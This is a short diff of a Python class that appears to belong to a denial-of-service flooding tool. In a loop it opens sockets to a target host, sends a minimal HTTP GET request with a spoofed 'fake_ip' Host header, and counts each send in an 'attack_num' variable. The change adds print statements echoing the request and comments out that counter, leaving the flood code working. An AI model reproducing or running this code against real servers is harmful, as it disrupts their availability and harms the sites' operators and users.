@@ -151,9 +151,10 @@ class App:
                     s.connect((host, port))
                     s.sendto(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'), (host, port))
                     s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (host, port))
-                    
-                    global attack_num
-                    attack_num += 1
+                    print(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'), (host, port))
+                    print(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (host, port))
+                    #global attack_num
+                    #attack_num += 1
                     #print(attack_num)
                     
                     s.close()
